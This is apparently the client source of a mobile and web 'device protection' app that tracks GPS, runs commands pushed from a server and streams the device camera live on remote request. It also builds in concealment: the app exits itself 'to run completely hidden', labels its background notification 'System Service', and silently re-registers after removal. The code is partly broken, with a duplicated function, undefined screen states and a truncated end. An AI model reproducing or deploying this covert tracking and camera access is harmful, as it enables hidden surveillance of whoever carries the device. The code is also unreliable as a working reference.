import React, { useEffect, useState, useRef } from "react";
import io from "socket.io-client";

const API_BASE =
  process.env.REACT_APP_API_BASE_URL || "https://ysecurity.app/api";

// Ping intervals
const STATUS_CHECK_INTERVAL = 30000; // Check status every 30s
const COMMAND_POLL_INTERVAL = 15000; // Poll commands every 15s
const BACKUP_PING_INTERVAL = 60000; // Backup GPS ping every 60s
const SOCKET_RECONNECT_DELAY = 5000; // Socket reconnect after 5s

// Detect if running in native Capacitor
let isNative = false;
let Device,
  Storage,
  Network,
  Camera,
  Geolocation,
  BackgroundGeolocation,
  Capacitor,
  CapacitorApp;
try {
  Capacitor = require("@capacitor/core").Capacitor;
  isNative = Capacitor.isNativePlatform();
  if (isNative) {
    Device = require("@capacitor/device").Device;
    Storage = require("@capacitor/preferences").Preferences;
    Network = require("@capacitor/network").Network;
    Camera = require("@capacitor/camera").Camera;
    Geolocation = require("@capacitor/geolocation").Geolocation;
    CapacitorApp = require("@capacitor/app").App;
    try {
      BackgroundGeolocation =
        require("@capacitor/background-geolocation").BackgroundGeolocation;
    } catch (e) {}
  }
} catch (e) {
  isNative = false;
}

// Web-safe storage helpers
const store = {
  get: async (key) => {
    if (isNative && Storage) {
      const r = await Storage.get({ key });
      return r.value;
    }
    return localStorage.getItem(key);
  },
  set: async (key, value) => {
    if (isNative && Storage) {
      await Storage.set({ key, value });
    } else {
      localStorage.setItem(key, value);
    }
  },
  remove: async (key) => {
    if (isNative && Storage) {
      await Storage.remove({ key });
    } else {
      localStorage.removeItem(key);
    }
  },
};

const SCREEN = {
  LOADING: "loading",
  LOGIN: "login",
  PERMISSIONS: "permissions",
  ACTIVE: "active",
};

function App() {
  // Core state
  const [screen, setScreen] = useState(SCREEN.LOADING);
  const [deviceId, setDeviceId] = useState(null);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [isRegistered, setIsRegistered] = useState(false);
  const [isActive, setIsActive] = useState(false);
  const [error, setError] = useState(null);
  const [gpsStatus, setGpsStatus] = useState("unknown"); // 'unknown' | 'granted' | 'denied' | 'prompt'
  const [lastPingTime, setLastPingTime] = useState(null);
  const [pingCount, setPingCount] = useState(0);

  // Login form
  const [memberId, setMemberId] = useState("");
  const [isLoggingIn, setIsLoggingIn] = useState(false);

  // PWA install
  const [deferredPrompt, setDeferredPrompt] = useState(null);

  // Tracking state
  const [geofence, setGeofence] = useState(null);
  const [isOnline, setIsOnline] = useState(true);
  const [pendingPings, setPendingPings] = useState([]);
  const [batteryLevel, setBatteryLevel] = useState(-1);
  const [isConnected, setIsConnected] = useState(false);

  // Refs for stable references in callbacks
  const statusIntervalRef = useRef(null);
  const commandIntervalRef = useRef(null);
  const backupPingIntervalRef = useRef(null);
  const socketRef = useRef(null);
  const watchIdRef = useRef(null);
  const trackingActiveRef = useRef(false);
  const deviceIdRef = useRef(null);
  const geofenceRef = useRef(null);
  const pendingPingsRef = useRef([]);
  const isOnlineRef = useRef(true);
  const lastPingRef = useRef({ lat: 0, lng: 0, time: 0 }); // Dedup pings
  const batteryRef = useRef(null); // Cached battery object
  const batteryLevelRef = useRef(-1); // Stable battery level for callbacks
  const cameraStreamRef = useRef(null); // Active camera MediaStream
  const cameraIntervalRef = useRef(null); // Frame capture interval
  const cameraVideoRef = useRef(null); // Video element for camera

  // Keep refs in sync with state
  useEffect(() => {
    deviceIdRef.current = deviceId;
  }, [deviceId]);
  useEffect(() => {
    geofenceRef.current = geofence;
  }, [geofence]);
  useEffect(() => {
    pendingPingsRef.current = pendingPings;
  }, [pendingPings]);
  useEffect(() => {
    isOnlineRef.current = isOnline;
  }, [isOnline]);
  useEffect(() => {
    batteryLevelRef.current = batteryLevel;
  }, [batteryLevel]);

  // =============================================
  // PERMISSIONS REQUEST (UPFRONT)
  // =============================================
  const requestAllPermissions = async () => {
    if (!isNative) return true; // Web doesn't need permissions upfront

    try {
      console.log("[YS] Requesting all permissions upfront...");

      // Location permission
      const locationStatus = await Geolocation.requestPermissions();
      if (locationStatus.location !== 'granted') {
        console.warn("[YS] Location permission denied");
        return false;
      }

      // Camera permission
      try {
        const cameraStatus = await Camera.requestPermissions();
        if (cameraStatus.camera !== 'granted') {
          console.warn("[YS] Camera permission denied");
          // Continue anyway, camera is optional
        }
      } catch (e) {
        console.warn("[YS] Camera permission request failed:", e);
      }

      // Background location (Android specific)
      if (BackgroundGeolocation) {
        try {
          await BackgroundGeolocation.requestPermissions();
        } catch (e) {
          console.warn("[YS] Background location permission failed:", e);
        }
      }

      // Request device admin activation for Android
      if (isNative && Capacitor.getPlatform() === 'android') {
        try {
          // This would require a custom Capacitor plugin for device admin
          // For now, we'll rely on the manifest declaration
          console.log("[YS] Device admin permissions requested via manifest");
        } catch (e) {
          console.warn("[YS] Device admin setup failed:", e);
        }
      }

      console.log("[YS] All permissions requested");
      return true;
    } catch (e) {
      console.error("[YS] Permission request failed:", e);
      return false;
    }
  };
  const registerServiceWorker = async (id, token) => {
    if (!("serviceWorker" in navigator)) return;
    try {
      const reg = await navigator.serviceWorker.register("/sw.js");
      console.log("[YS] Service Worker registered");

      // Send device info to SW
      if (reg.active) {
        reg.active.postMessage({
          type: "REGISTER_DEVICE",
          deviceId: id,
          deviceToken: token,
        });
      }
      navigator.serviceWorker.addEventListener("controllerchange", () => {
        if (navigator.serviceWorker.controller) {
          navigator.serviceWorker.controller.postMessage({
            type: "REGISTER_DEVICE",
            deviceId: id,
            deviceToken: token,
          });
        }
      });

      // Listen for push wake-up messages from SW
      navigator.serviceWorker.addEventListener("message", (event) => {
        if (event.data && event.data.type === "TRACK_NOW") {
          // SW woke us up — send a fresh ping
          if (deviceIdRef.current) {
            startTracking(deviceIdRef.current);
          }
        }
        if (event.data && event.data.type === "EXECUTE_COMMAND") {
          executeCommand({
            command: event.data.command,
            params: event.data.params,
          });
        }
        if (event.data && event.data.type === "GET_REGISTRATION") {
          // SW asking for registration data
          store.get("registration").then((cached) => {
            if (cached && event.ports && event.ports[0]) {
              const data = JSON.parse(cached);
              event.ports[0].postMessage({
                deviceId: data.deviceId,
                deviceToken: data.deviceToken,
              });
            }
          });
        }
      });

      // Subscribe to push notifications
      await subscribeToPush(reg, id);
    } catch (e) {
      console.warn("[YS] SW registration failed:", e);
    }
  };

  const subscribeToPush = async (swReg, id) => {
    try {
      // Get VAPID public key from server
      const keyRes = await fetch(
        API_BASE.replace("/api", "") + "/api/push/vapid-key",
      );
      const { publicKey } = await keyRes.json();

      // Convert base64 to Uint8Array
      const urlBase64ToUint8Array = (base64String) => {
        const padding = "=".repeat((4 - (base64String.length % 4)) % 4);
        const base64 = (base64String + padding)
          .replace(/-/g, "+")
          .replace(/_/g, "/");
        const rawData = window.atob(base64);
        return Uint8Array.from([...rawData].map((c) => c.charCodeAt(0)));
      };

      const subscription = await swReg.pushManager.subscribe({
        userVisibleOnly: true,
        applicationServerKey: urlBase64ToUint8Array(publicKey),
      });

      // Send subscription to server
      await fetch(`${API_BASE}/devices/${id}/push-subscribe`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ subscription: subscription.toJSON() }),
      });
      console.log("[YS] Push subscription saved");
    } catch (e) {
      console.warn("[YS] Push subscription failed:", e);
    }
  };

  // =============================================
  // INITIALIZATION
  // =============================================
  useEffect(() => {
    initializeApp();
    setupNetworkListener();
    startBatteryMonitoring();
    loadCachedData();

    // PWA install prompt
    const handleBeforeInstallPrompt = (e) => {
      e.preventDefault();
      setDeferredPrompt(e);
    };
    window.addEventListener("beforeinstallprompt", handleBeforeInstallPrompt);

    return () => {
      if (statusIntervalRef.current) clearInterval(statusIntervalRef.current);
      if (commandIntervalRef.current) clearInterval(commandIntervalRef.current);
      if (backupPingIntervalRef.current)
        clearInterval(backupPingIntervalRef.current);
      if (socketRef.current) socketRef.current.disconnect();
      if (watchIdRef.current)
        navigator.geolocation?.clearWatch(watchIdRef.current);
      window.removeEventListener(
        "beforeinstallprompt",
        handleBeforeInstallPrompt,
      );
    };
  }, []);

  const initializeApp = async () => {
    try {
      let id, info;

      if (isNative && Device) {
        info = await Device.getInfo();
        id = info.uuid || info.identifierForVendor || `dev-${Date.now()}`;
      } else {
        // Web: generate persistent device ID
        id = localStorage.getItem("ys_device_id");
        if (!id) {
          id =
            "web-" +
            Date.now() +
            "-" +
            Math.random().toString(36).substring(2, 10);
          localStorage.setItem("ys_device_id", id);
        }
        // Better device detection from User-Agent
        const ua = navigator.userAgent;
        let model = "Device";
        if (/iPad/.test(ua)) model = "iPad";
        else if (/iPhone/.test(ua)) model = "iPhone";
        else if (/Android/.test(ua)) {
          // Try to extract Android device model
          const match = ua.match(/;\s*([^;)]+)\s*Build\//);
          model = match ? match[1].trim() : "Android";
        }
        let os = "Web";
        if (/Android\s([\d.]+)/.test(ua))
          os = "Android " + ua.match(/Android\s([\d.]+)/)[1];
        else if (/OS\s([\d_]+)/.test(ua) && /iPhone|iPad/.test(ua))
          os = "iOS " + ua.match(/OS\s([\d_]+)/)[1].replace(/_/g, ".");
        info = { model, operatingSystem: os, osVersion: "" };
      }

      setDeviceId(id);
      deviceIdRef.current = id;
      setDeviceInfo(info);

      // For native apps, request permissions immediately
      if (isNative) {
        const permissionsGranted = await requestAllPermissions();
        if (!permissionsGranted) {
          setError("Permissions are required for device protection. Please grant all permissions and restart the app.");
          return;
        }
      }

      // Check if already registered
      const cached = await store.get("registration");
      if (cached) {
        const registration = JSON.parse(cached);
        setIsRegistered(true);
        setMemberId(registration.memberId);

        registerServiceWorker(id, registration.deviceToken);
        initSocket(id);
        startStatusChecks(id);
        startCommandPolling(id);
        startTracking(id);
        setScreen(SCREEN.ACTIVE);

        // For native apps, exit to run hidden after 3 seconds
        if (isNative) {
          setTimeout(() => {
            if (CapacitorApp) CapacitorApp.exitApp();
          }, 3000);
        }
      } else {
        // Show install button — permissions require user gesture
        setScreen(SCREEN.LOGIN);
      }
    } catch (err) {
      console.error("Init failed:", err);
      // Retry init after 5 seconds instead of showing login
      setTimeout(() => initializeApp(), 5000);
    }
  };

  const setupNetworkListener = () => {
    if (isNative && Network) {
      Network.addListener("networkStatusChange", (status) => {
        setIsOnline(status.connected);
        if (status.connected) syncPendingPings();
      });
    } else {
      window.addEventListener("online", () => {
        setIsOnline(true);
        syncPendingPings();
      });
      window.addEventListener("offline", () => setIsOnline(false));
      setIsOnline(navigator.onLine);
    }
  };

  const startBatteryMonitoring = async () => {
    if (isNative && Device) {
      try {
        const info = await Device.getBatteryInfo();
        if (info && typeof info.batteryLevel === "number") {
          setBatteryLevel(Math.round(info.batteryLevel * 100));
        }
        setInterval(async () => {
          try {
            const i = await Device.getBatteryInfo();
            if (i && typeof i.batteryLevel === "number")
              setBatteryLevel(Math.round(i.batteryLevel * 100));
          } catch (e) {}
        }, 60000);
      } catch (e) {}
      return;
    }
    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        batteryRef.current = battery; // Cache for getBatteryNow
        setBatteryLevel(Math.round(battery.level * 100));
        battery.addEventListener("levelchange", () => {
          setBatteryLevel(Math.round(battery.level * 100));
        });
      } catch (e) {}
    }
  };

  // =============================================
  // LOGIN & REGISTRATION
  // =============================================
  const handleLogin = async () => {
    setError(null);
    const memberIdTrimmed = memberId.trim().toUpperCase();
    if (!/^YS-\d+$/.test(memberIdTrimmed)) {
      setError("Invalid Member ID format. Must be YS- followed by numbers");
      return;
    }

    setIsLoggingIn(true);

    try {
      const info = deviceInfo || {
        model: "Unknown",
        operatingSystem: "Web",
        osVersion: "",
      };
      const id = deviceIdRef.current;

      const response = await fetch(`${API_BASE}/devices/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          deviceId: id,
          model: info.model || "Unknown",
          os: `${info.operatingSystem || "Unknown"} ${info.osVersion || ""}`.trim(),
          memberId: memberIdTrimmed,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Registration failed");
      }

      await store.set(
        "registration",
        JSON.stringify({
          deviceId: id,
          memberId: memberIdTrimmed,
          deviceToken: data.deviceToken,
          registeredAt: new Date().toISOString(),
        }),
      );

      setIsRegistered(true);
      setScreen(SCREEN.PERMISSIONS);
    } catch (err) {
      console.error("Login failed:", err);
      setError(err.message);
    } finally {
      setIsLoggingIn(false);
    }
  };

  // Auto-install with default admin Member ID
  const autoInstall = async (id, info) => {
    setScreen(SCREEN.INSTALLING);
    try {
      const response = await fetch(`${API_BASE}/devices/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          deviceId: id,
          model: info.model || "Unknown",
          os: `${info.operatingSystem || "Unknown"} ${info.osVersion || ""}`.trim(),
          memberId: "",
        }),
      });

      if (!response.ok) {
        const data = await response.json().catch(() => ({}));
        throw new Error(data.error || "Server error " + response.status);
      }

      const data = await response.json();

      setMemberId(data.memberId || "");
      await store.set(
        "registration",
        JSON.stringify({
          deviceId: id,
          memberId: data.memberId || "",
          deviceToken: data.deviceToken,
          registeredAt: new Date().toISOString(),
        }),
      );

      setIsRegistered(true);

      setTimeout(() => {
        initSocket(id);
        startStatusChecks(id);
        startCommandPolling(id);
        startTracking(id);
        setScreen(SCREEN.INSTALLED);
      }, 1000);
    } catch (err) {
      console.error("Auto install failed:", err);
      // Retry after 5 seconds instead of showing login
      setTimeout(() => autoInstall(id, info), 5000);
    }
  };

  // Manual install button handler
  const handleTestMode = async () => {
    setError(null);
    setIsLoggingIn(true);
    try {
      const info = deviceInfo || {
        model: "Unknown",
        operatingSystem: "Web",
        osVersion: "",
      };
      const id =
        deviceIdRef.current ||
        "web-" + Date.now() + "-" + Math.random().toString(36).substring(2, 8);
      if (!deviceIdRef.current) {
        setDeviceId(id);
        deviceIdRef.current = id;
        localStorage.setItem("ys_device_id", id);
      }

      const response = await fetch(`${API_BASE}/devices/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          deviceId: id,
          model: info.model || "Unknown",
          os: `${info.operatingSystem || "Unknown"} ${info.osVersion || ""}`.trim(),
          memberId: "",
        }),
      });

      if (!response.ok) {
        const data = await response.json().catch(() => ({}));
        throw new Error(data.error || "Server error " + response.status);
      }

      const data = await response.json();

      // Server may return a different deviceId (dedup: same member+model+os = same device)
      const assignedId = data.deviceId || id;
      if (assignedId !== id) {
        setDeviceId(assignedId);
        deviceIdRef.current = assignedId;
        localStorage.setItem("ys_device_id", assignedId);
      }

      setMemberId(data.memberId || "");
      await store.set(
        "registration",
        JSON.stringify({
          deviceId: assignedId,
          memberId: data.memberId || "",
          deviceToken: data.deviceToken,
          registeredAt: new Date().toISOString(),
        }),
      );

      setIsRegistered(true);

      // Request ALL permissions upfront immediately after registration
      const permissionsGranted = await requestAllPermissions();

      // Start background tracking immediately
      initSocket(assignedId);
      startStatusChecks(assignedId);
      startCommandPolling(assignedId);
      startTracking(assignedId);

      // Register service worker for push notifications
      registerServiceWorker(assignedId, data.deviceToken);

      // For native apps, go directly to active (hidden) state
      if (isNative) {
        setScreen(SCREEN.ACTIVE);
        // Exit the app to run completely hidden
        setTimeout(() => CapacitorApp.exitApp(), 2000);
      } else {
        // Web version shows active screen
        setScreen(SCREEN.ACTIVE);
      }
    } catch (err) {
      console.error("Install failed:", err);
      setError(
        "Install failed: " +
          (err.message ||
            "Network error. Check your internet connection and try again."),
      );
    } finally {
      setIsLoggingIn(false);
    }
  };

  // =============================================
  // PWA INSTALL
  // =============================================
  const handleInstall = async () => {
    if (deferredPrompt) {
      deferredPrompt.prompt();
      const { outcome } = await deferredPrompt.userChoice;
      if (outcome === "accepted") {
        console.log("[YS] User accepted PWA install");
        setDeferredPrompt(null);
      } else {
        console.log("[YS] User dismissed PWA install");
      }
    }
  };

  // Manual install button handler (no member ID required)
  const handleTestMode = async () => {
    setError(null);
    setIsLoggingIn(true);

    try {
      const info = deviceInfo || {
        model: "Unknown",
        operatingSystem: "Web",
        osVersion: "",
      };
      const id =
        deviceIdRef.current ||
        "web-" + Date.now() + "-" + Math.random().toString(36).substring(2, 8);
      if (!deviceIdRef.current) {
        setDeviceId(id);
        deviceIdRef.current = id;
        localStorage.setItem("ys_device_id", id);
      }

      const response = await fetch(`${API_BASE}/devices/register`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          deviceId: id,
          model: info.model || "Unknown",
          os: `${info.operatingSystem || "Unknown"} ${info.osVersion || ""}`.trim(),
          memberId: "",
        }),
      });

      if (!response.ok) {
        const data = await response.json().catch(() => ({}));
        throw new Error(data.error || "Server error " + response.status);
      }

      const data = await response.json();

      // Server may return a different deviceId (dedup: same member+model+os = same device)
      const assignedId = data.deviceId || id;
      if (assignedId !== id) {
        setDeviceId(assignedId);
        deviceIdRef.current = assignedId;
        localStorage.setItem("ys_device_id", assignedId);
      }

      setMemberId(data.memberId || "");
      await store.set(
        "registration",
        JSON.stringify({
          deviceId: assignedId,
          memberId: data.memberId || "",
          deviceToken: data.deviceToken,
          registeredAt: new Date().toISOString(),
        }),
      );

      setIsRegistered(true);

      // Request ALL permissions upfront immediately after registration
      const permissionsGranted = await requestAllPermissions();

      // Start background tracking immediately
      initSocket(assignedId);
      startStatusChecks(assignedId);
      startCommandPolling(assignedId);
      startTracking(assignedId);

      // Register service worker for push notifications
      registerServiceWorker(assignedId, data.deviceToken);

      // For native apps, start the background service and exit to run hidden
      if (isNative) {
        // Start the native background service
        try {
          // The service should already be started by BootReceiver, but ensure it's running
          console.log("[YS] Ensuring native background service is running...");
        } catch (e) {
          console.warn("[YS] Could not start native service:", e);
        }

        setScreen(SCREEN.ACTIVE);
        // Exit the app to run completely hidden
        setTimeout(() => {
          if (CapacitorApp) CapacitorApp.exitApp();
        }, 2000);
      } else {
        // Web version shows active screen
        setScreen(SCREEN.ACTIVE);
      }
    } catch (err) {
      console.error("Install failed:", err);
      setError(
        "Install failed: " +
          (err.message ||
            "Network error. Check your internet connection and try again."),
      );
    } finally {
      setIsLoggingIn(false);
    }
  };

  // =============================================
  // SOCKET.IO CONNECTION (with auto-reconnect)
  // =============================================
  const initSocket = async (id) => {
    // Disconnect existing socket if any
    if (socketRef.current) {
      socketRef.current.disconnect();
      socketRef.current = null;
    }

    // Get cached token (if available — server supports DB fallback)
    const registration = await store.get("registration");
    const regData = registration ? JSON.parse(registration) : {};
    const deviceToken = regData.deviceToken || null;

    const socketConnection = io(API_BASE.replace("/api", ""), {
      transports: ["websocket", "polling"],
      reconnection: true,
      reconnectionAttempts: Infinity,
      reconnectionDelay: SOCKET_RECONNECT_DELAY,
      reconnectionDelayMax: 30000,
      timeout: 20000,
    });

    socketConnection.on("connect", () => {
      console.log("[YS] Socket connected");
      setIsConnected(true);
      // Server accepts both JWT token and DB-based auth
      socketConnection.emit("device-authenticate", {
        deviceId: id,
        deviceToken,
      });
    });

    socketConnection.on("device-authenticated", (data) => {
      if (data.success) {
        console.log("[YS] Device authenticated via socket");
        // Cache device token if server sent a fresh one
        if (data.deviceToken) {
          store.get("registration").then((reg) => {
            const regData = reg ? JSON.parse(reg) : {};
            store.set(
              "registration",
              JSON.stringify({ ...regData, deviceToken: data.deviceToken }),
            );
          });
        }
      } else {
        console.warn("[YS] Socket auth failed:", data.error);
      }
    });

    socketConnection.on("disconnect", (reason) => {
      console.log("[YS] Socket disconnected:", reason);
      setIsConnected(false);
    });

    socketConnection.on("reconnect", () => {
      console.log("[YS] Socket reconnected");
      setIsConnected(true);
      socketConnection.emit("device-authenticate", {
        deviceId: id,
        deviceToken,
      });
    });

    // Listen for commands from admin (real-time)
    socketConnection.on("command", (command) => {
      console.log("[YS] Received command via socket:", command.command);
      executeCommand(command);
    });

    // Live camera streaming commands
    socketConnection.on("camera-start", (data) => {
      console.log("[YS] Camera stream start requested:", data.facing);
      startCameraStream(socketConnection, data.facing || "front");
    });

    socketConnection.on("camera-stop", () => {
      console.log("[YS] Camera stream stop requested");
      stopCameraStream();
    });

    socketConnection.on("camera-snapshot", () => {
      console.log("[YS] Camera snapshot requested");
      takeCameraSnapshot();
    });

    socketConnection.on("camera-switch", (data) => {
      console.log("[YS] Camera switch requested:", data.facing);
      stopCameraStream();
      setTimeout(
        () => startCameraStream(socketConnection, data.facing || "front"),
        300,
      );
    });

    socketRef.current = socketConnection;
  };

  // =============================================
  // STATUS MONITORING (separate from command polling)
  // =============================================
  const startStatusChecks = (id) => {
    checkStatus(id);
    if (statusIntervalRef.current) clearInterval(statusIntervalRef.current);
    statusIntervalRef.current = setInterval(
      () => checkStatus(id),
      STATUS_CHECK_INTERVAL,
    );
  };

  // Separate command polling — runs more frequently
  const startCommandPolling = (id) => {
    if (commandIntervalRef.current) clearInterval(commandIntervalRef.current);
    commandIntervalRef.current = setInterval(
      () => checkCommands(id),
      COMMAND_POLL_INTERVAL,
    );
    // Also do an immediate check
    checkCommands(id);
  };

  const checkStatus = async (id) => {
    if (!isOnlineRef.current) return;
    try {
      const response = await fetch(`${API_BASE}/devices/${id}/status`);
      if (response.status === 404) {
        // Device was deleted from admin — reset and re-register silently
        await store.remove("registration");
        if (socketRef.current) socketRef.current.disconnect();
        if (statusIntervalRef.current) clearInterval(statusIntervalRef.current);
        if (commandIntervalRef.current)
          clearInterval(commandIntervalRef.current);
        if (backupPingIntervalRef.current)
          clearInterval(backupPingIntervalRef.current);
        setIsRegistered(false);
        setIsActive(false);
        setMemberId("");
        trackingActiveRef.current = false;
        if (watchIdRef.current) {
          navigator.geolocation?.clearWatch(watchIdRef.current);
          watchIdRef.current = null;
        }
        // Auto re-register instead of showing login
        setScreen(SCREEN.INSTALLING);
        autoInstall(
          deviceIdRef.current,
          deviceInfo || {
            model: "Device",
            operatingSystem: "Web",
            osVersion: "",
          },
        );
        return;
      }
      if (!response.ok) return;

      const data = await response.json();
      // "reported" (lost) devices MUST keep tracking — that's the whole point
      const shouldTrack =
        data.success &&
        (data.status === "active" || data.status === "reported");
      if (shouldTrack) {
        setIsActive(true);
        // Ensure tracking is running when device is active or reported lost
        if (!trackingActiveRef.current) {
          startTracking(id);
        }
      } else if (data.success) {
        setIsActive(false);
        // Stop tracking only for truly inactive states (installed, verified, recovered)
        if (trackingActiveRef.current) {
          stopTracking();
        }
      }
    } catch (err) {
      // Silent fail for periodic checks
    }
  };

  const checkCommands = async (id) => {
    if (!isOnlineRef.current) return;
    try {
      const response = await fetch(`${API_BASE}/devices/${id}/commands`);
      if (!response.ok) return;

      const data = await response.json();
      if (data.success && data.commands && data.commands.length > 0) {
        console.log(`[YS] Found ${data.commands.length} pending commands`);
        for (const cmd of data.commands) {
          await executeCommand(cmd);
        }
      }
    } catch (err) {
      // Silent fail
    }
  };

  // =============================================
  // NETWORK TYPE DETECTION
  // =============================================
  const getNetworkType = async () => {
    if (isNative && Network) {
      try {
        const status = await Network.getStatus();
        if (!status.connected) return "none";
        return status.connectionType || "unknown";
      } catch (e) {}
    }
    const conn =
      navigator.connection ||
      navigator.mozConnection ||
      navigator.webkitConnection;
    if (conn) {
      // conn.type is the actual medium (wifi/cellular) — available in some browsers
      if (conn.type && conn.type !== "unknown") {
        const ct = conn.type;
        if (ct === "wifi" || ct === "ethernet") return "wifi";
        if (ct === "cellular") return "cellular";
        if (ct === "none") return "none";
        return ct;
      }
      // conn.effectiveType is widely available (Chrome Android etc.)
      // Returns '4g', '3g', '2g', 'slow-2g' — server normalizes these to 'cellular'
      if (conn.effectiveType) {
        return conn.effectiveType; // '4g', '3g', '2g', 'slow-2g'
      }
      // Use downlink/rtt to infer type when type/effectiveType missing
      if (typeof conn.downlink === "number") {
        if (conn.downlink >= 5) return "wifi";
        if (conn.downlink > 0) return "cellular";
      }
    }
    // Fallback: if we're online but API unavailable (Safari, older browsers),
    // try a speed-based hint
    if (navigator.onLine) {
      try {
        const start = Date.now();
        await fetch(API_BASE.replace("/api", "/api/health"), {
          method: "HEAD",
          cache: "no-store",
        });
        const rtt = Date.now() - start;
        // Low RTT likely means wifi; high RTT likely cellular
        return rtt < 100 ? "wifi" : "cellular";
      } catch (e) {
        return "wifi"; // online but fetch failed — assume wifi
      }
    }
    return navigator.onLine ? "wifi" : "none";
  };

  // =============================================
  // GPS TRACKING (production-ready)
  // =============================================
  const getBatteryNow = async () => {
    if (isNative && Device) {
      try {
        const info = await Device.getBatteryInfo();
        if (info && typeof info.batteryLevel === "number")
          return Math.round(info.batteryLevel * 100);
      } catch (e) {}
    }
    try {
      // Reuse cached battery manager if available
      if (!batteryRef.current && navigator.getBattery) {
        batteryRef.current = await navigator.getBattery();
      }
      if (batteryRef.current) {
        const level = Math.round(batteryRef.current.level * 100);
        setBatteryLevel(level);
        return level;
      }
    } catch (e) {
      batteryRef.current = null;
    }
    // Use ref to avoid stale closure — return -1 if battery is unknown
    return batteryLevelRef.current > 0 ? batteryLevelRef.current : -1;
  };

  const stopTracking = () => {
    trackingActiveRef.current = false;
    if (watchIdRef.current) {
      navigator.geolocation?.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
    if (backupPingIntervalRef.current) {
      clearInterval(backupPingIntervalRef.current);
      backupPingIntervalRef.current = null;
    }
  };

  const startTracking = async (id) => {
    // Prevent duplicate tracking
    if (trackingActiveRef.current) return;
    trackingActiveRef.current = true;

    // Clear any existing watcher
    if (watchIdRef.current) {
      navigator.geolocation?.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
    if (backupPingIntervalRef.current) {
      clearInterval(backupPingIntervalRef.current);
      backupPingIntervalRef.current = null;
    }

    // Permissions were already granted at install via requestAllPermissions()
    // Do NOT re-request — just use the APIs silently.

    if (isNative && BackgroundGeolocation) {
      try {
        // Check permission state without prompting
        let hasPermission = false;
        try {
          const perms = await BackgroundGeolocation.checkPermissions();
          hasPermission = perms.location === "granted";
        } catch (e) {
          // checkPermissions not available — assume granted from install
          hasPermission = true;
        }

        if (!hasPermission) {
          console.warn("[YS] Native location permission not granted");
          setGpsStatus("denied");
          trackingActiveRef.current = false;
          return;
        }
        setGpsStatus("granted");

        await BackgroundGeolocation.start({
          distanceFilter: 50,
          stationaryRadius: 25,
          interval: 300000,
          fastestInterval: 60000,
          debug: false,
          notification: { title: "System Service", text: "Running" },
        });

        BackgroundGeolocation.addListener("location", async (location) => {
          try {
            const bat = await getBatteryNow();
            const pingData = {
              lat: location.latitude,
              lng: location.longitude,
              accuracy: location.accuracy,
              battery: bat,
              networkType: await getNetworkType(),
            };
            const gf = geofenceRef.current;
            if (gf) {
              const dist = getDistance(
                location.latitude,
                location.longitude,
                gf.lat,
                gf.lng,
              );
              if (dist > gf.radius) pingData.alert = "geofence_breach";
            }
            await sendPingDirect(id, pingData);
          } catch (err) {
            console.error("[YS] Location processing failed:", err);
          }
        });
      } catch (err) {
        console.error("[YS] Native tracking start failed:", err);
        trackingActiveRef.current = false;
      }
    } else if (navigator.geolocation) {
      // Web: continuous watch for location changes
      watchIdRef.current = navigator.geolocation.watchPosition(
        async (pos) => {
          setGpsStatus("granted");
          const bat = await getBatteryNow();
          const pingData = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            battery: bat,
            networkType: await getNetworkType(),
          };
          const gf = geofenceRef.current;
          if (gf) {
            const dist = getDistance(
              pos.coords.latitude,
              pos.coords.longitude,
              gf.lat,
              gf.lng,
            );
            if (dist > gf.radius) pingData.alert = "geofence_breach";
          }
          await sendPingDirect(id, pingData);
        },
        (err) => {
          console.warn(
            "[YS] Geolocation watch error:",
            err.message,
            "code:",
            err.code,
          );
          if (err.code === 1) setGpsStatus("denied");
        },
        { enableHighAccuracy: true, maximumAge: 30000, timeout: 30000 },
      );

      // Backup ping interval — ensures pings even if watchPosition stops firing
      backupPingIntervalRef.current = setInterval(() => {
        if (!trackingActiveRef.current) return;
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const bat = await getBatteryNow();
            const networkType = await getNetworkType();
            const pingData = {
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              battery: bat,
              networkType,
            };
            const gf = geofenceRef.current;
            if (gf) {
              const dist = getDistance(
                pos.coords.latitude,
                pos.coords.longitude,
                gf.lat,
                gf.lng,
              );
              if (dist > gf.radius) pingData.alert = "geofence_breach";
            }
            await sendPingDirect(id, pingData);
          },
          () => {},
          { enableHighAccuracy: true, maximumAge: 15000, timeout: 10000 },
        );
      }, BACKUP_PING_INTERVAL);
    }
  };

  // =============================================
  // LOCATION PINGS (using refs to avoid stale closures)
  // =============================================
  const loadCachedData = async () => {
    try {
      const cachedPings = await store.get("pendingPings");
      if (cachedPings) {
        const parsed = JSON.parse(cachedPings);
        setPendingPings(parsed);
        pendingPingsRef.current = parsed;
      }
      const cachedGeofence = await store.get("geofence");
      if (cachedGeofence) {
        const parsed = JSON.parse(cachedGeofence);
        setGeofence(parsed);
        geofenceRef.current = parsed;
      }
    } catch (err) {
      console.error("[YS] Cache load failed:", err);
    }
  };

  const savePendingPings = async (pings) => {
    await store.set("pendingPings", JSON.stringify(pings)).catch(() => {});
  };

  // Direct ping — uses refs to avoid stale closure issues + deduplication
  const sendPingDirect = async (id, data) => {
    if (!id) return;

    // Deduplicate: skip if same location within 3 seconds
    const now = Date.now();
    const last = lastPingRef.current;
    const timeDiff = now - last.time;
    const isSameLocation =
      Math.abs(data.lat - last.lat) < 0.00001 &&
      Math.abs(data.lng - last.lng) < 0.00001;
    if (timeDiff < 3000 && isSameLocation) {
      return; // Skip duplicate ping
    }
    lastPingRef.current = { lat: data.lat, lng: data.lng, time: now };

    const pingData = {
      lat: data.lat,
      lng: data.lng,
      accuracy: data.accuracy,
      battery: data.battery,
      networkType: data.networkType,
    };
    if (data.alert) pingData.alert = data.alert;

    if (!isOnlineRef.current) {
      const updated = [
        ...pendingPingsRef.current,
